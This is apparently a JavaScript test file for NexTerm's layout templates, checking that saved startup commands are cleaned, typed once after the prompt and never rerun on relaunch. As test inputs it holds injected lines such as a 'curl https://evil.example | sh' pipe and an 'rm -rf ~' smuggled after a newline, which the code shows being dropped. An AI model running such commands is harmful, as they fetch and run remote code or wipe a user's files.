/**
 * Layout templates — tmuxinator's "open a project and the server, the tests
 * and the agent start at once", built on the saved groups NexTerm already had.
 *
 * A saved group (and a saved workspace: every group at once) may give each of
 * its terminals a startup command, kept on the terminal's slot as `command`.
 * Opening it opens the shells as before, and each one types its command as
 * soon as it is ready — the very wait an agent gets (`untilPromptReady`: the
 * shell's first OSC 133 "D", or AGENT_PROMPT_WAIT_MS for a shell that sends
 * none), then the line and `\r`, through `writeRaw`.
 *
 * What these cases hold:
 *   - what a command may be: one line, no key a line editor would act on
 *     (`sanitizeStartupCommand`), refused rather than mangled when it is not;
 *   - what saving offers as the default: the command running in a terminal,
 *     or the agent NexTerm started there — never an idle shell's last command;
 *   - editing, all or nothing, written through to disk;
 *   - opening: typed once each, only after the prompt, never for an empty
 *     slot, never into a terminal that closed or is already running something;
 *   - entries written before any of this, and hand-edited ones;
 *   - saved workspaces, which share the code path;
 *   - that a relaunch restores shells and runs nothing in them.
 *
 * Writes are held here rather than answered by the mock, which answers every
 * unknown command with "command not found" and a D at once.
 */
import { describe, test, beforeEach, afterEach, assert } from '../e2e/harness/testFramework.js';
import * as terminalStore from '../../src/stores/terminalStore.js';
import { mockBridge } from '../../src/lib/ipc.js';
import { SCHEMA_VERSION } from '../../src/lib/persistence.js';
import { NEW_LINE } from '../../src/lib/suggestionLayer.js';
import {
  followCommandLine,
  isMultiLine,
  MULTI_LINE_REASON,
  normalizeSlotCommand,
  sanitizeStartupCommand,
  startupCount,
  suggestStartupCommand,
  withStartupCommands,
} from '../../src/lib/startupCommands.js';

const S = terminalStore.useTerminalStore;
const { SAVED_GROUPS_KEY, SAVED_WORKSPACES_KEY, PERSIST_KEY } = terminalStore;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// --- a disk of this file's own ----------------------------------------------
const backing = new Map();
let previousLocalStorage;
let shimInstalled = false;

function installStorageShim() {
  if (!shimInstalled) {
    previousLocalStorage = globalThis.localStorage;
    shimInstalled = true;
  }
  globalThis.localStorage = {
    getItem: (k) => (backing.has(k) ? backing.get(k) : null),
    setItem: (k, v) => backing.set(k, String(v)),
    removeItem: (k) => backing.delete(k),
    clear: () => backing.clear(),
  };
}

let previousWait = null;
let previousInfers = null;

function teardown() {
  S.getState().dispose();
  if (previousWait !== null) terminalStore.__setAgentPromptWaitMs(previousWait);
  if (previousInfers !== null) terminalStore.__setSubmitInfersRunning(previousInfers);
  previousWait = null;
  previousInfers = null;
  if (!shimInstalled) return;
  if (previousLocalStorage === undefined) delete globalThis.localStorage;
  else globalThis.localStorage = previousLocalStorage;
  shimInstalled = false;
}

/**
 * The app as it starts. A shell gets `promptWaitMs` to draw its first prompt —
 * long enough by default that no case here meets the timeout by accident —
 * and a line typed is never taken as running on a clock (that is Windows'
 * inference, which `agent_lifecycle.test.js` owns): a command runs here when
 * its shell says so, with a C.
 */
async function freshStart({ keepStorage = false, seed = null, promptWaitMs = 2000 } = {}) {
  S.getState().dispose();
  installStorageShim();
  if (!keepStorage) backing.clear();
  if (seed) {
    for (const [key, payload] of Object.entries(seed)) backing.set(key, JSON.stringify(payload));
  }
  previousWait = terminalStore.__setAgentPromptWaitMs(promptWaitMs);
  previousInfers = terminalStore.__setSubmitInfersRunning(false);
  S.setState({ tabs: [], activeTabId: null, isInitialized: false, savedGroups: [], savedWorkspaces: [] });
  await S.getState().init();
}

// --- the shell, as the backend reports it -----------------------------------
const tabById = (id) => S.getState().tabs.find((t) => t.id === id);
/** The shell drew a prompt: the D its integration sends with every one. */
const prompt = (tabId, code = 0) =>
  mockBridge.emit('pty-command-done', { session_id: tabById(tabId).sessionId, exit_code: code });
/** The shell started running the line: OSC 133 C. */
const started = (tabId) => mockBridge.emit('pty-command-started', { session_id: tabById(tabId).sessionId });

/** Type `text` key by key, as xterm hands keys to the store, and press Enter. */
async function typeLine(tabId, text) {
  for (const key of text) await S.getState().writeRaw(tabId, key);
  await S.getState().writeRaw(tabId, '\r');
}

/**
 * Everything written to any terminal while `fn` runs, as `{ tabId, data }`,
 * held the way a busy shell holds input: nothing answers it.
 */
async function holdingWrites(fn) {
  const original = mockBridge.invoke;
  const typed = [];
  mockBridge.invoke = function (command, args, ...rest) {
    if (command === 'pty_write') {
      const tab = S.getState().tabs.find((t) => t.sessionId === args?.session_id);
      typed.push({ tabId: tab?.id ?? null, data: args?.data });
      return Promise.resolve(null);
    }
    return original.call(this, command, args, ...rest);
  };
  try {
    await fn(typed);
  } finally {
    mockBridge.invoke = original;
  }
  return typed;
}

const leavesOf = (node, acc = []) => {
  if (!node) return acc;
  if (node.type === 'leaf') acc.push(node);
  else node.children.forEach((c) => leavesOf(c, acc));
  return acc;
};
const groupById = (id) => S.getState().groups.find((g) => g.id === id);
const activeGroup = () => groupById(S.getState().activeGroupId);
const tabsOfGroup = (id) => leavesOf(groupById(id).tree).flatMap((l) => l.tabIds);
/** The terminal of group `groupId` carrying `title`. */
const byTitle = (groupId, title) => tabsOfGroup(groupId).map(tabById).find((t) => t.title === title);
const storedGroups = () => JSON.parse(backing.get(SAVED_GROUPS_KEY)).data;

/** A saved group as this build writes it: three terminals side by side. */
const template = (commands = {}) => ({
  id: 'saved-dev',
  name: 'Dev',
  savedAt: 1,
  tabs: [
    { slotId: 'slot-0', title: 'server', cwd: '/workspace', ...(commands.server ? { command: commands.server } : {}) },
    { slotId: 'slot-1', title: 'tests', cwd: '/workspace', ...(commands.tests ? { command: commands.tests } : {}) },
    { slotId: 'slot-2', title: 'shell', cwd: '/workspace', ...(commands.shell ? { command: commands.shell } : {}) },
  ],
  activePaneId: 'saved-pane-1',
  tree: {
    type: 'split',
    id: 'saved-split-1',
    direction: 'horizontal',
    sizes: [40, 30, 30],
    children: ['slot-0', 'slot-1', 'slot-2'].map((slot, i) => ({
      type: 'leaf',
      id: `saved-pane-${i + 1}`,
      tabIds: [slot],
      activeTabId: slot,
    })),
  },
});

describe('Layout templates: what a startup command may be', () => {
  test('LT-01: one line, trimmed, with nothing in it a line editor would take as a key', () => {
    assert.deepEqual(sanitizeStartupCommand('npm run dev'), { ok: true, command: 'npm run dev' });
    // A paste that kept its newline is still one line.
    assert.deepEqual(sanitizeStartupCommand('  npm run dev\r\n'), { ok: true, command: 'npm run dev' });
    // Empty, and anything that is not text, is just a shell.
    for (const empty of ['', '   ', null, undefined, 42, {}]) {
      assert.deepEqual(sanitizeStartupCommand(empty), { ok: true, command: '' }, `${JSON.stringify(empty)} is no command`);
    }
    // A line break of any kind would run what comes before it: refused, with a reason.
    for (const twoLines of ['npm install\nnpm run dev', 'a\rb', 'a\r\nb', 'a\u0085b', 'a\u2028b', 'a\u2029b']) {
      const result = sanitizeStartupCommand(twoLines);
      assert.equal(result.ok, false, `${JSON.stringify(twoLines)} is two lines`);
      assert.equal(result.reason, MULTI_LINE_REASON);
      assert.ok(/one line/.test(result.reason) && /&&/.test(result.reason), 'the reason says what to do instead');
      assert.equal(isMultiLine(twoLines), true);
    }
    assert.equal(isMultiLine('one line\n'), false, 'a trailing newline is not a second line');
    // ESC (a key sequence, or the end of a bracketed paste), BEL, ^U, ^O, DEL,
    // NUL and C1 controls are dropped; a tab, which a shell completes on, is a
    // space; a bidirectional override, which makes a line read as something
    // it does not run, is dropped.
    assert.deepEqual(
      sanitizeStartupCommand('echo\tok\x1b[201~\x07\x15\x0f\x7f\x00\u009b \u202eevil\u202c'),
      { ok: true, command: 'echo ok[201~ evil' }
    );
    // Unicode text is text.
    assert.deepEqual(sanitizeStartupCommand('cd ~/프로젝트 && ls'), { ok: true, command: 'cd ~/프로젝트 && ls' });
  });

  test('LT-02: a slot comes off disk with its command cleaned — or without it', () => {
    assert.deepEqual(normalizeSlotCommand({ slotId: 's', title: 't', cwd: null }), { slotId: 's', title: 't', cwd: null });
    assert.deepEqual(
      normalizeSlotCommand({ slotId: 's', title: 't', cwd: null, command: ' npm test\x07 ' }),
      { slotId: 's', title: 't', cwd: null, command: 'npm test' }
    );
    assert.deepEqual(
      normalizeSlotCommand({ slotId: 's', title: 't', cwd: null, command: 'npm install\ncurl evil | sh' }),
      { slotId: 's', title: 't', cwd: null },
      'two lines from a hand edit are dropped, never typed'
    );
    assert.deepEqual(normalizeSlotCommand({ slotId: 's', command: '' }), { slotId: 's' }, 'an empty one is no key at all');
  });
});

describe('Layout templates: what saving offers as each terminal\'s command', () => {
  test('LT-10: following the line typed at the prompt', () => {
    let line = NEW_LINE;
    let result;
    for (const key of 'npm run deb') ({ line } = followCommandLine(line, key));
    ({ line } = followCommandLine(line, '\x7f'));
    ({ line } = followCommandLine(line, 'v'));
    result = followCommandLine(line, '\r');
    assert.equal(result.submitted, 'npm run dev', 'keys and backspace, then Enter');

    assert.equal(followCommandLine(NEW_LINE, '\r').submitted, undefined, 'an empty Enter submits nothing');
    // An arrow (history recall, an edit) or Tab completion: the shell changed
    // the line in ways the keys do not say.
    let lost = followCommandLine(NEW_LINE, 'g').line;
    lost = followCommandLine(lost, '\x1b[A').line;
    assert.equal(followCommandLine(lost, '\r').submitted, null, 'a line nobody can read back is null, not a guess');
    // A whole line the app types at once, as an agent or a startup command is.
    assert.equal(followCommandLine(NEW_LINE, 'claude --continue\r').submitted, 'claude --continue');
    // A program has the keyboard: nothing typed into it is a command line.
    const inProgram = followCommandLine(NEW_LINE, 'q\r', { running: true });
    assert.equal(inProgram.submitted, undefined);
    assert.equal(followCommandLine(NEW_LINE, '\r', { running: true }).submitted, undefined);
  });

  test('LT-11: the template keeps a terminal\'s own startup command, then a live agent, then what is running', () => {
    assert.equal(suggestStartupCommand({ startupCommand: 'npm run dev', running: false }), 'npm run dev');
    assert.equal(
      suggestStartupCommand({ agent: { kind: 'claude', sessionId: 'd4bef4d0-c043-40ef-b157-640fb31ac0ea' }, running: true, commandLine: 'claude --session-id d4bef4d0-c043-40ef-b157-640fb31ac0ea' }),
      'claude',
      'the agent as a command that starts one — never `--session-id` with an id already in use'
    );
    assert.equal(suggestStartupCommand({ agent: { kind: 'opencode' }, running: true }), 'opencode');
    assert.equal(
      suggestStartupCommand({ agent: { kind: 'claude' }, agentResumeOffered: true }),
      '',
      'an agent only offered back after a restart is not running'
    );
    assert.equal(suggestStartupCommand({ running: true, commandLine: 'npm test -- --watch' }), 'npm test -- --watch');
    assert.equal(
      suggestStartupCommand({ running: false, commandLine: 'git push --force' }),
      '',
      'an idle shell\'s last command is what it did, not what it is for — opening the template would run it again'
    );
    assert.equal(suggestStartupCommand({ running: true, commandLine: null }), '', 'a line nobody could read: nothing');
    assert.equal(suggestStartupCommand({ exited: { code: 0 }, running: false, commandLine: 'x' }), '');
    assert.equal(suggestStartupCommand(null), '');
  });

  test('LT-12: Save Group offers the command running in a terminal, and nothing for an idle one', async () => {
    await freshStart();
    try {
      const first = S.getState().tabs[0].id;
      S.getState().renameTab(first, 'server');
      const second = (await S.getState().createTab('repl')).id;
      await holdingWrites(async () => {
        await typeLine(first, 'npm run dev');
        await started(first); // the shell says it is running
        await typeLine(second, 'git status');
        await started(second);
        await prompt(second); // ...and that it finished
      });
      assert.equal(tabById(first).commandLine, 'npm run dev', 'the line is followed as it is typed');

      const entry = S.getState().saveGroup(activeGroup().id, 'Dev');
      assert.deepEqual(entry.tabs, [
        { slotId: 'slot-0', title: 'server', cwd: tabById(first).cwd, command: 'npm run dev' },
        { slotId: 'slot-1', title: 'repl', cwd: tabById(second).cwd },
      ], 'running: offered; idle: exactly the slot every saved group always had');
      assert.equal(storedGroups()[0].tabs[0].command, 'npm run dev', 'and it is written to disk with the group');
      assert.equal(startupCount(entry), 1);
    } finally {
      teardown();
    }
  });

  test('LT-13: an agent NexTerm started is offered as the agent, not as the line it typed', async () => {
    await freshStart();
    try {
      const tab = S.getState().tabs[0].id;
      await holdingWrites(async () => {
        await prompt(tab);
        await S.getState().startAgent(tab, 'claude');
        await started(tab);
      });
      assert.ok(/^claude --session-id /.test(tabById(tab).commandLine), 'setup: the typed line carries the id');
      const entry = S.getState().saveGroup(activeGroup().id, 'Agent');
      assert.equal(entry.tabs[0].command, 'claude');
    } finally {
      teardown();
    }
  });
});

describe('Layout templates: editing', () => {
  beforeEach(() => freshStart({ seed: { [SAVED_GROUPS_KEY]: { version: SCHEMA_VERSION, data: [template({ server: 'npm run dev' })] } } }));
  afterEach(teardown);

  test('LT-20: set, change and clear each terminal\'s command, written through to disk', () => {
    const result = S.getState().setStartupCommands('saved-dev', {
      'slot-0': 'npm run dev -- --port 4000',
      'slot-1': 'npm test -- --watch',
      'slot-2': '',
    });
    assert.equal(result.ok, true);
    const commands = (entry) => entry.tabs.map((t) => t.command ?? '');
    assert.deepEqual(commands(result.entry), ['npm run dev -- --port 4000', 'npm test -- --watch', '']);
    assert.deepEqual(commands(S.getState().savedGroups[0]), commands(result.entry));
    assert.deepEqual(commands(storedGroups()[0]), commands(result.entry), 'written through, like a rename');
    assert.equal('command' in result.entry.tabs[2], false, 'an empty field leaves no key behind');

    // A slot the edit does not mention keeps what it had; '' clears.
    S.getState().setStartupCommands('saved-dev', { 'slot-1': '' });
    assert.deepEqual(commands(S.getState().savedGroups[0]), ['npm run dev -- --port 4000', '', '']);
    // The layout and everything else is untouched.
    assert.deepEqual(S.getState().savedGroups[0].tree, template().tree);
  });

  test('LT-21: a multi-line command is refused with its reason, and nothing changes', () => {
    const before = backing.get(SAVED_GROUPS_KEY);
    const result = S.getState().setStartupCommands('saved-dev', {
      'slot-0': 'npm install\nnpm run dev',
      'slot-1': 'npm test',
    });
    assert.equal(result.ok, false);
    assert.deepEqual(result.errors, { 'slot-0': MULTI_LINE_REASON }, 'the reason, by the field it belongs to');
    assert.equal(S.getState().savedGroups[0].tabs[1].command, undefined, 'all or nothing: the good field is not saved either');
    assert.equal(backing.get(SAVED_GROUPS_KEY), before, 'and nothing was written');
    assert.equal(S.getState().setStartupCommands('no-such-entry', {}).ok, false);
  });

  test('LT-22: control characters are cleaned on the way in', () => {
    const result = S.getState().setStartupCommands('saved-dev', { 'slot-1': ' npm\ttest\x1b[201~ ' });
    assert.equal(result.ok, true);
    assert.equal(result.entry.tabs[1].command, 'npm test[201~');
  });

  test('LT-23: withStartupCommands is the same rule for any snapshot', () => {
    const snap = template({ server: 'a' });
    const changed = withStartupCommands(snap, { 'slot-2': 'b' });
    assert.equal(changed.ok, true);
    assert.equal(changed.snapshot.tabs[2].command, 'b');
    assert.equal(snap.tabs[2].command, undefined, 'the snapshot handed in is not modified');
  });
});

describe('Layout templates: opening one', () => {
  afterEach(teardown);

  test('LT-30: each terminal types its command once, only after its shell has drawn a prompt; an empty slot types nothing', async () => {
    await freshStart({
      seed: { [SAVED_GROUPS_KEY]: { version: SCHEMA_VERSION, data: [template({ server: 'npm run dev', tests: 'npm test -- --watch' })] } },
      promptWaitMs: 400,
    });
    const typed = await holdingWrites(async (writes) => {
      const groupId = await S.getState().loadSavedGroup('saved-dev');
      assert.ok(groupId, 'the template opens');
      assert.equal(S.getState().activeGroupId, groupId, 'on screen');
      assert.equal(leavesOf(groupById(groupId).tree).length, 3, 'with its layout');
      await sleep(50);
      assert.deepEqual(writes, [], 'nothing is typed before a shell has drawn a prompt — it would be typeahead, echoed twice');

      const server = byTitle(groupId, 'server');
      const tests = byTitle(groupId, 'tests');
      const shell = byTitle(groupId, 'shell');
      await prompt(server.id);
      await sleep(10);
      assert.deepEqual(writes, [{ tabId: server.id, data: 'npm run dev\r' }], 'the server types once its prompt is there');

      await prompt(tests.id);
      await prompt(shell.id);
      await sleep(10);
      // More prompts, and the whole prompt wait run out: nothing twice.
      await prompt(server.id);
      await prompt(tests.id);
      await sleep(500);
      assert.deepEqual(writes, [
        { tabId: server.id, data: 'npm run dev\r' },
        { tabId: tests.id, data: 'npm test -- --watch\r' },
      ], 'each command exactly once; the empty slot is just a shell');
      assert.equal(tabById(server.id).startupCommand, 'npm run dev', 'the terminal remembers what it was opened with');
      assert.equal(tabById(shell.id).startupCommand, undefined);
    });
    assert.equal(typed.length, 2);
  });

  test('LT-31: a shell that never draws a prompt it reports gets its command when the wait is up', async () => {
    await freshStart({
      seed: { [SAVED_GROUPS_KEY]: { version: SCHEMA_VERSION, data: [template({ shell: 'fish_config' })] } },
      promptWaitMs: 80,
    });
    await holdingWrites(async (writes) => {
      const groupId = await S.getState().loadSavedGroup('saved-dev');
      await sleep(20);
      assert.deepEqual(writes, [], 'not before the wait is up');
      await sleep(150);
      assert.deepEqual(writes.map((w) => w.data), ['fish_config\r'], 'typed anyway, as an agent is');
      assert.equal(writes[0].tabId, byTitle(groupId, 'shell').id);
    });
  });

  test('LT-32: nothing is typed into a terminal that closed first, or that is already running something', async () => {
    await freshStart({
      seed: { [SAVED_GROUPS_KEY]: { version: SCHEMA_VERSION, data: [template({ server: 'npm run dev', tests: 'npm test' })] } },
      promptWaitMs: 120,
    });
    await holdingWrites(async (writes) => {
      const groupId = await S.getState().loadSavedGroup('saved-dev');
      const server = byTitle(groupId, 'server');
      const tests = byTitle(groupId, 'tests');
      await S.getState().closeTab(server.id); // gone before its prompt
      await started(tests.id); // something got there first
      await sleep(250);
      assert.deepEqual(writes, [], 'not into a closed terminal, and not into a running program');
    });
  });

  test('LT-33: Load into Current Group types the commands too', async () => {
    await freshStart({
      seed: { [SAVED_GROUPS_KEY]: { version: SCHEMA_VERSION, data: [template({ tests: 'npm test' })] } },
    });
    await holdingWrites(async (writes) => {
      const here = activeGroup().id;
      const groupId = await S.getState().loadSavedGroup('saved-dev', { mode: 'replace' });
      assert.equal(groupId, here, 'into the group on screen');
      const tests = byTitle(here, 'tests');
      for (const id of tabsOfGroup(here)) await prompt(id);
      await sleep(10);
      assert.deepEqual(writes, [{ tabId: tests.id, data: 'npm test\r' }]);
    });
  });

  test('LT-34: the same line in PowerShell, cmd or zsh — typed as is, run with \\r', async () => {
    for (const shell of ['powershell.exe', 'cmd.exe', '/bin/zsh']) {
      await freshStart({
        seed: { [SAVED_GROUPS_KEY]: { version: SCHEMA_VERSION, data: [template({ server: 'Get-ChildItem | Select-Object -First 3' })] } },
      });
      const { useSettingsStore } = await import('../../src/stores/settingsStore.js');
      const previous = useSettingsStore.getState().terminalDefaultShell;
      useSettingsStore.setState({ terminalDefaultShell: shell });
      try {
        await holdingWrites(async (writes) => {
          const groupId = await S.getState().loadSavedGroup('saved-dev');
          const server = byTitle(groupId, 'server');
          assert.equal(server.shell, shell, `setup: the terminal runs ${shell}`);
          await prompt(server.id);
          await sleep(10);
          assert.deepEqual(writes.map((w) => w.data), ['Get-ChildItem | Select-Object -First 3\r'], `${shell}: the line and \\r`);
        });
      } finally {
        useSettingsStore.setState({ terminalDefaultShell: previous });
        teardown();
      }
    }
  });

  test('LT-35: a group opened from a template, saved again, keeps its commands', async () => {
    await freshStart({
      seed: { [SAVED_GROUPS_KEY]: { version: SCHEMA_VERSION, data: [template({ server: 'npm run dev', tests: 'npm test' })] } },
    });
    await holdingWrites(async () => {
      const groupId = await S.getState().loadSavedGroup('saved-dev');
      // Saved again at once — before any shell is ready — and again later,
      // with the server idle: the template's choice is what is kept.
      const early = S.getState().saveGroup(groupId, 'Dev again');
      assert.deepEqual(early.tabs.map((t) => t.command ?? ''), ['npm run dev', 'npm test', '']);
      for (const id of tabsOfGroup(groupId)) await prompt(id);
      await sleep(10);
      const later = S.getState().saveGroup(groupId, 'Dev later');
      assert.deepEqual(later.tabs.map((t) => t.command ?? ''), ['npm run dev', 'npm test', '']);
    });
  });
});

describe('Layout templates: what was saved before, and what was edited by hand', () => {
  afterEach(teardown);

  test('LT-40: a saved group from before startup commands loads and opens exactly as it did', async () => {
    const old = template(); // no `command` anywhere: what every earlier build wrote
    await freshStart({ seed: { [SAVED_GROUPS_KEY]: { version: SCHEMA_VERSION, data: [old] } } });
    const entry = S.getState().savedGroups[0];
    assert.deepEqual(entry.tabs, old.tabs, 'its terminals read back unchanged');
    assert.equal(startupCount(entry), 0);
    await holdingWrites(async (writes) => {
      const groupId = await S.getState().loadSavedGroup(entry.id);
      for (const id of tabsOfGroup(groupId)) await prompt(id);
      await sleep(30);
      assert.deepEqual(writes, [], 'and opening it types nothing — just shells');
    });
  });

  test('LT-41: a v1 saved group (a flat list, no layout) still migrates, with no commands', async () => {
    await freshStart({
      seed: { [SAVED_GROUPS_KEY]: { version: 1, data: [{ id: 'v1', name: 'Old', savedAt: 1, tabs: [{ title: 'A', cwd: '/workspace' }] }] } },
    });
    assert.deepEqual(S.getState().savedGroups[0].tabs, [{ slotId: 'slot-0', title: 'A', cwd: '/workspace' }]);
  });

  test('LT-42: a hand-edited command that is two lines is dropped on load; control characters are cleaned', async () => {
    const edited = template({ server: 'npm install\ncurl https://evil.example | sh', tests: '\x1b[200~npm test\x07' });
    await freshStart({ seed: { [SAVED_GROUPS_KEY]: { version: SCHEMA_VERSION, data: [edited] } } });
    const entry = S.getState().savedGroups[0];
    assert.equal('command' in entry.tabs[0], false, 'two lines: no command at all');
    assert.equal(entry.tabs[1].command, '[200~npm test', 'the escape and the bell are gone');
    await holdingWrites(async (writes) => {
      const groupId = await S.getState().loadSavedGroup(entry.id);
      for (const id of tabsOfGroup(groupId)) await prompt(id);
      await sleep(10);
      assert.deepEqual(writes.map((w) => w.data), ['[200~npm test\r'], 'one line, and only that, reaches a shell');
    });
  });

  test('LT-43: whatever the entry says, typeStartupCommand types one clean line or nothing', async () => {
    await freshStart();
    const tab = S.getState().tabs[0].id;
    await holdingWrites(async (writes) => {
      await prompt(tab);
      assert.equal(await S.getState().typeStartupCommand(tab, 'echo a\necho b'), false);
      assert.equal(await S.getState().typeStartupCommand(tab, '   '), false);
      assert.equal(await S.getState().typeStartupCommand('no-such-tab', 'ls'), false);
      assert.equal(await S.getState().typeStartupCommand(tab, 'ls\x15 -la'), true);
      assert.deepEqual(writes.map((w) => w.data), ['ls -la\r']);
    });
  });
});

describe('Layout templates: saved workspaces, and a relaunch', () => {
  afterEach(teardown);

  test('LT-50: Save Workspace offers each group\'s running commands, and restoring it types them once each', async () => {
    await freshStart();
    const server = S.getState().tabs[0].id;
    S.getState().renameTab(server, 'server');
    const other = await S.getState().createGroup({ name: 'Agents' });
    const agentTab = leavesOf(groupById(other.id).tree)[0].tabIds[0];
    S.getState().renameTab(agentTab, 'agent');
    await holdingWrites(async () => {
      await typeLine(server, 'npm run dev');
      await started(server);
      await typeLine(agentTab, 'opencode');
      await started(agentTab);
    });
    const entry = S.getState().saveWorkspace('Desk');
    assert.deepEqual(entry.groups.map((g) => g.tabs.map((t) => t.command)), [['npm run dev'], ['opencode']]);

    await holdingWrites(async (writes) => {
      await S.getState().loadWorkspace(entry.id, { mode: 'replace' });
      await sleep(30);
      assert.deepEqual(writes, [], 'nothing before a prompt');
      for (const t of S.getState().tabs) await prompt(t.id);
      await sleep(10);
      for (const t of S.getState().tabs) await prompt(t.id);
      await sleep(10);
      assert.deepEqual(writes.map((w) => w.data).sort(), ['npm run dev\r', 'opencode\r'], 'every group, each once');
    });
  });

  test('LT-51: a workspace\'s commands are edited per group, all or nothing, and survive a relaunch', async () => {
    await freshStart();
    S.getState().renameTab(S.getState().tabs[0].id, 'one');
    await S.getState().createGroup({ name: 'Second' });
    const entry = S.getState().saveWorkspace('Desk');
    assert.equal(entry.groups.every((g) => g.tabs.every((t) => !('command' in t))), true, 'setup: nothing running, nothing offered');

    const refused = S.getState().setWorkspaceStartupCommands(entry.id, [{ 'slot-0': 'make' }, { 'slot-0': 'a\nb' }]);
    assert.equal(refused.ok, false);
    assert.deepEqual(refused.errors, [{}, { 'slot-0': MULTI_LINE_REASON }], 'the reason, by group and slot');
    assert.equal(S.getState().savedWorkspaces[0].groups[0].tabs[0].command, undefined, 'all or nothing');

    const saved = S.getState().setWorkspaceStartupCommands(entry.id, [{ 'slot-0': 'make watch' }, { 'slot-0': 'npm run storybook' }]);
    assert.equal(saved.ok, true);
    assert.deepEqual(saved.entry.groups.map((g) => g.tabs[0].command), ['make watch', 'npm run storybook']);

    // Written through, and read back — cleaned — after a relaunch.
    const onDisk = JSON.parse(backing.get(SAVED_WORKSPACES_KEY));
    onDisk.data[0].groups[1].tabs[0].command = 'npm run storybook\nrm -rf ~';
    backing.set(SAVED_WORKSPACES_KEY, JSON.stringify(onDisk));
    await freshStart({ keepStorage: true });
    const reread = S.getState().savedWorkspaces[0];
    assert.equal(reread.groups[0].tabs[0].command, 'make watch');
    assert.equal('command' in reread.groups[1].tabs[0], false, 'a hand edit that made it two lines is dropped');
  });

  test('LT-52: the live session never carries a startup command, and a relaunch types nothing', async () => {
    await freshStart({
      seed: { [SAVED_GROUPS_KEY]: { version: SCHEMA_VERSION, data: [template({ server: 'npm run dev' })] } },
    });
    await holdingWrites(async () => {
      const groupId = await S.getState().loadSavedGroup('saved-dev');
      for (const id of tabsOfGroup(groupId)) await prompt(id);
      await sleep(10);
    });
    await sleep(400); // the layout's own write-behind
    const payload = backing.get(PERSIST_KEY);
    assert.ok(payload, 'setup: the session was written');
    assert.equal(/npm run dev|startupCommand|commandLine/.test(payload), false, 'no command in the saved session');

    await holdingWrites(async (writes) => {
      await freshStart({ keepStorage: true });
      assert.ok(S.getState().tabs.length >= 4, 'setup: the session came back');
      for (const t of S.getState().tabs) await prompt(t.id);
      await sleep(30);
      assert.deepEqual(writes, [], 'a relaunch brings the shells back and runs nothing in them');
    });
  });
});
